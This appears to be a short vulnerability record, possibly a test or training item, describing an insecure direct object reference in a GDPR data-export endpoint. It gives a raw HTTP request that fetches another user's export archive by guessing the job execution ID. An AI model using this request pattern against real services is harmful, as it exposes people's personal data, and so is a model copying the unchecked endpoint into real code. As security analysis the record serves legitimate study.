diagnosis: The GDPR export batch controller returns download links for generated data archives based on the jobExecutionId path variable. Because the endpoint does not verify that the batch job execution was triggered by the authenticated user, an attacker can enumerate execution IDs to download full PII data archives of other platform users.
exploit_request:
GET /batch/gdpr-exports/18804/artifact HTTP/1.1
Host: accounts.cloudservice.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzg4MTEifQ.token
